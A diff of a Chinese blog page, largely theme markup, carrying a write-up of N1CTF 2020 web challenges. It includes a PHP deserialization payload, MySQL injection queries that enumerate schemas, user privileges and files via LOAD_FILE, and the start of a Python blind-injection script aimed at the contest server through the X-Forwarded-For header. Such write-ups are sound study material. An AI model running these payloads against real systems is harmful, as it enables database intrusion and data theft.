@@ -1,223 +1,233 @@
+
+
 <!DOCTYPE html>
-<html lang="zh">
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.1.1">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="欢迎大家发表自己的见解与评价">
+  <meta name="author" content="slug01sh">
+  <meta name="keywords" content="生活,安全,编程,英语">
+  <title>2020年10月N1CTF部分web题解 - slug01sh&#39;s blog</title>
 
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta name="description" content="题解地址：https:&#x2F;&#x2F;github.com&#x2F;Nu1LCTF&#x2F;n1ctf-2020国内比较好的比赛，将题目都放出来了，正好可以抽时间把「西湖论剑」的题目好好补补。">
-<meta property="og:type" content="article">
-<meta property="og:title" content="2020年10月N1CTF部分web题解">
-<meta property="og:url" content="http://example.com/2020/10/17/20201017-N1CTF/index.html">
-<meta property="og:site_name" content="slug01sh&#39;s blog">
-<meta property="og:description" content="题解地址：https:&#x2F;&#x2F;github.com&#x2F;Nu1LCTF&#x2F;n1ctf-2020国内比较好的比赛，将题目都放出来了，正好可以抽时间把「西湖论剑」的题目好好补补。">
-<meta property="og:locale">
-<meta property="og:image" content="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/55A7478F-5E91-4039-99E6-05DE0ED86183.png">
-<meta property="og:image" content="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D65E9F75-E63F-46BE-9B5A-120238A16663.png">
-<meta property="article:published_time" content="2020-10-17T01:13:22.000Z">
-<meta property="article:modified_time" content="2020-11-08T01:30:19.041Z">
-<meta property="article:author" content="slug01sh">
-<meta property="article:tag" content="生活">
-<meta property="article:tag" content="安全">
-<meta property="article:tag" content="编程">
-<meta property="article:tag" content="英语">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/55A7478F-5E91-4039-99E6-05DE0ED86183.png">
-
-<link rel="canonical" href="http://example.com/2020/10/17/20201017-N1CTF/">
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
 
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : false,
-    isPost : true,
-    lang   : 'zh'
-  };
-</script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
 
-  <title>2020年10月N1CTF部分web题解 | slug01sh's blog</title>
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
   
 
 
 
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
 
 
 
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
 
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
 
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
+<link  rel="stylesheet" href="/css/main.css" />
 
-</head>
+<!-- 自定义样式保持在最底部 -->
 
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
 
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.1.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
     </div>
   </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">slug01sh's blog</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-      <p class="site-subtitle" itemprop="description">Think with the world</p>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-首页">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-分类">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-标签">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-归档">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-        <li class="menu-item menu-item-关于">
-
-    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
-
-  </li>
-  </ul>
 </nav>
 
-
-
-
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content post posts-expand">
-            
-
-    
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/17/20201017-N1CTF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="slug01sh">
-      <meta itemprop="description" content="欢迎大家发表自己的见解与评价">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="slug01sh's blog">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          2020年10月N1CTF部分web题解
-        </h1>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2020-10-17 09:13:22" itemprop="dateCreated datePublished" datetime="2020-10-17T09:13:22+08:00">2020-10-17</time>
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="2020年10月N1CTF部分web题解">
+              
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-11-08 09:30:19" itemprop="dateModified" datetime="2020-11-08T09:30:19+08:00">2020-11-08</time>
-              </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-10-17 09:13" pubdate>
+        2020年10月17日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      15
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
 
           
-
         </div>
-      </header>
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
       
-        <p>题解地址：<a target="_blank" rel="noopener" href="https://github.com/Nu1LCTF/n1ctf-2020">https://github.com/Nu1LCTF/n1ctf-2020</a><br>国内比较好的比赛，将题目都放出来了，正好可以抽时间把「西湖论剑」的题目好好补补。</p>
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2020年10月N1CTF部分web题解</h1>
+            
+            <div class="markdown-body">
+              <p>题解地址：<a target="_blank" rel="noopener" href="https://github.com/Nu1LCTF/n1ctf-2020">https://github.com/Nu1LCTF/n1ctf-2020</a><br>国内比较好的比赛，将题目都放出来了，正好可以抽时间把「西湖论剑」的题目好好补补。</p>
 <hr>
 <a id="more"></a>
 
@@ -252,15 +262,15 @@
 </li>
 </ul>
 <p>反序列化：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">O:4:&quot;flag&quot;:2:&#123;s:2:&quot;ip&quot;;O:2:&quot;ip&quot;:1:&#123;s:2:&quot;ip&quot;;s:9:&quot;127.0.0.1&quot;;&#125;s:5:&quot;check&quot;;s:6:&quot;thrmen&quot;;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><br><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:&quot;flag&quot;</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>;<span class="hljs-attribute">O</span>:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;ip&quot;</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;127.0.0.1&quot;</span>;&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:&quot;check&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:6</span><span class="hljs-selector-pseudo">:&quot;thrmen&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure>
 
-<p>时间盲注 SQL 语句：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/55A7478F-5E91-4039-99E6-05DE0ED86183.png"></p>
-<p>被 ban 的函数：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D65E9F75-E63F-46BE-9B5A-120238A16663.png"></p>
+<p>时间盲注 SQL 语句：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/55A7478F-5E91-4039-99E6-05DE0ED86183.png" srcset="/img/loading.gif"></p>
+<p>被 ban 的函数：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/D65E9F75-E63F-46BE-9B5A-120238A16663.png" srcset="/img/loading.gif"></p>
 <p>用到的SQL语句:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 查询数据库名字</span><br><span class="line"># database()</span><br><span class="line"></span><br><span class="line"># 查询数据库信息</span><br><span class="line"># SELECT concat(version(),0x3a,user(),0x3a,database(),0x3a,@@datadir,0x3a,@@version_compile_os)</span><br><span class="line"></span><br><span class="line"># 查询文件读取权限</span><br><span class="line"># select group_concat(user,0x3a,file_priv) from mysql.user</span><br><span class="line"></span><br><span class="line"># 查询当前用户</span><br><span class="line"># select user()</span><br><span class="line"></span><br><span class="line"># 查询数据库版本</span><br><span class="line"># version()</span><br><span class="line"></span><br><span class="line"># 查询表名的长度</span><br><span class="line">#  (select length(table_name) from information_schema.tables where table_schema&#x3D;&#39;n1ctf_websign&#39; limit 0,1) &lt; 0</span><br><span class="line"></span><br><span class="line"># 查询表名（修改后面的 limit）</span><br><span class="line"># select table_name from information_schema.tables where table_schema&#x3D;DATABASE() limit 1,1</span><br><span class="line"></span><br><span class="line"># 判断字段名（修改后面的 limit）</span><br><span class="line"># select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;n1key&#39; limit 0,1。</span><br><span class="line"></span><br><span class="line"># 查询 ip 表。（边插入边查询，需要使用别名）</span><br><span class="line"># SELECT tid FROM (select ip tid from n1ip limit 0,1) AS tt</span><br><span class="line"></span><br><span class="line"># 查询某个字段的数据（key 与数据库的关键词相冲突，需要使用别名）</span><br><span class="line"># select GROUP_CONCAT(id) FROM n1key</span><br><span class="line"># select group_concat(bb.key) from n1key bb</span><br><span class="line"># select group_concat(key) FROM (SELECT * FROM n1key) as a</span><br><span class="line"># select id from n1key limit 0,1</span><br><span class="line"># 不使用字段名度值</span><br><span class="line"># SELECT a.2 FROM (SELECT 1, 2 UNION SELECT * FROM n1key</span><br><span class="line"></span><br><span class="line"># 判断是否有数据</span><br><span class="line"># SELECT (SELECT key FROM n1key) IS NULL</span><br><span class="line"></span><br><span class="line"># 查询文件</span><br><span class="line"># SELECT LOAD_FILE(&#39;&#x2F;flag&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><br># 查询数据库名字<br># <span class="hljs-keyword">database</span>()<br><br># 查询数据库信息<br># <span class="hljs-keyword">SELECT</span> concat(version(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">user</span>(),<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x3a</span>,@@datadir,<span class="hljs-number">0x3a</span>,@@version_compile_os)<br><br># 查询文件读取权限<br># <span class="hljs-keyword">select</span> group_concat(<span class="hljs-keyword">user</span>,<span class="hljs-number">0x3a</span>,file_priv) <span class="hljs-keyword">from</span> mysql.<span class="hljs-keyword">user</span><br><br># 查询当前用户<br># <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()<br><br># 查询数据库版本<br># version()<br><br># 查询表名的长度<br>#  (<span class="hljs-keyword">select</span> length(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;n1ctf_websign&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span><br><br># 查询表名（修改后面的 <span class="hljs-keyword">limit</span>）<br># <span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">DATABASE</span>() <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span>,<span class="hljs-number">1</span><br><br># 判断字段名（修改后面的 <span class="hljs-keyword">limit</span>）<br># <span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;n1key&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>。<br><br># 查询 ip 表。（边插入边查询，需要使用别名）<br># <span class="hljs-keyword">SELECT</span> tid <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">select</span> ip tid <span class="hljs-keyword">from</span> n1ip <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) <span class="hljs-keyword">AS</span> tt<br><br># 查询某个字段的数据（key 与数据库的关键词相冲突，需要使用别名）<br># <span class="hljs-keyword">select</span> GROUP_CONCAT(id) <span class="hljs-keyword">FROM</span> n1key<br># <span class="hljs-keyword">select</span> group_concat(bb.key) <span class="hljs-keyword">from</span> n1key bb<br># <span class="hljs-keyword">select</span> group_concat(key) <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">as</span> a<br># <span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> n1key <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br># 不使用字段名度值<br># <span class="hljs-keyword">SELECT</span> a<span class="hljs-number">.2</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span>, <span class="hljs-number">2</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> n1key<br><br># 判断是否有数据<br># <span class="hljs-keyword">SELECT</span> (<span class="hljs-keyword">SELECT</span> key <span class="hljs-keyword">FROM</span> n1key) <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span><br><br># 查询文件<br># <span class="hljs-keyword">SELECT</span> LOAD_FILE(<span class="hljs-string">&#x27;/flag&#x27;</span><br><br></code></pre></td></tr></table></figure>
 
 <p>爆破使用的脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://101.32.205.189/?input=O:4:%22flag%22:2:&#123;s:2:%22ip%22;O:2:%22ip%22:0:&#123;&#125;s:5:%22check%22;N;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成库名表名字符所在的字符列表字典</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ascii_str</span>():</span></span><br><span class="line">    str_list = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>, <span class="number">127</span>):  <span class="comment"># 所有可显示字符</span></span><br><span class="line">        str_list.append(chr(i))</span><br><span class="line">    <span class="comment"># print(&#x27;可显示字符：%s&#x27;%str_list)</span></span><br><span class="line">    <span class="comment"># # 返回字符列表</span></span><br><span class="line">    <span class="keyword">return</span> str_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">query</span>(<span class="params">sql</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;1&#x27;+(select (&quot;</span> + sql + <span class="string">&quot;) and exp(~(select * from (select user())n1ctf_websign)))+&#x27;&quot;</span></span><br><span class="line">    print(payload)</span><br><span class="line">    resp = session.get(</span><br><span class="line">        url=url,</span><br><span class="line">        headers=&#123;<span class="string">&quot;x-forwarded-for&quot;</span>: payload&#125;</span><br><span class="line">    )</span><br><span class="line">    soup = BeautifulSoup(markup=resp.text, features=<span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 提取判读 True 和 False 的依据</span></span><br><span class="line">    result = soup.find_all(name=<span class="string">&#x27;code&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># print(result)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 执行成功返回 True</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;n1ctf2020&quot;</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于测试函数是否正常执行（使用 while 不方便）</span></span><br><span class="line"><span class="comment"># param = f&quot;substr(database(), 1, 1)=&#x27;n&#x27;&quot;</span></span><br><span class="line"><span class="comment"># result = query(param)</span></span><br><span class="line"><span class="comment"># print(result)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 不同的字典</span></span><br><span class="line">CHAR_DICTIONARY1 = list(string.ascii_lowercase + string.ascii_uppercase + string.digits) + [<span class="string">&#x27;\\_&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line">CHAR_DICTIONARY2 = ascii_str()</span><br><span class="line"></span><br><span class="line"><span class="comment"># find 用于存储已找到的字符</span></span><br><span class="line">find = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 ascii 作用判断依据更好。</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    f = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">30</span>, <span class="number">127</span>):</span><br><span class="line">        pos = len(find) + <span class="number">1</span></span><br><span class="line">        s = <span class="string">&#x27;select table_name from information_schema.tables where table_schema=DATABASE() limit 1,1&#x27;</span></span><br><span class="line">        <span class="comment"># 使用 ascii 码进行判断（更优）</span></span><br><span class="line">        param = <span 